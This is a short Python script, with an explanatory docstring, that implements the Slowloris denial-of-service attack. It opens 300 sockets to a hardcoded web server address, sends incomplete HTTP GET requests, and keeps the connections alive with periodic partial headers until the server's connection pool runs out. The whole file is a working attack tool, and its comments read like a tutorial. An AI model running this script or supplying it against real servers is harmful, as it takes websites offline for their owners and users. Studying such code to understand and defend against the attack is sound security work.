"""
Slowloris is a DDoS attack that overwhelms the target by opening
and maintaining many simultaneous HTTP connections between the attacker and server.

We use socket and a real incomplete HTTP request to achieve this.

The server will hold the connection, waiting for the remainder of the request.
When we send enough open connections, the connection pool of the server is exhausted.


"""

import socket
import random
import time

target_ip = "192.168.168.10"
target_port = 80

def init_socket():
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((target_ip, target_port)) # we need to pass a tuple
    sock.send(b"GET /?" + str(random.randint(0, 2000)).encode("utf-8") + b" HTTP/1.1\r\n") # make id change each time "GET /?"
    sock.send(b"Host: " + target_ip.encode("utf-8") + b"\r\n")
    return sock


# another important aspect of slowloris is that it sends partial request headers to keep the connection open
def keep_open(sockets):
    for sock in sockets:
        try:
            sock.send(f"X-Header: {random.randint(1,5000)}\r\n".encode("utf-8"))
        except socket.error:
            sockets.remove(sock)


def main():
    open_sock = []

    for i in range(300):
        new_sock = init_socket()
        open_sock.append(new_sock)

    while True:
        keep_open(open_sock)
        time.sleep(10)


    
if __name__ == "__main__":
    main()
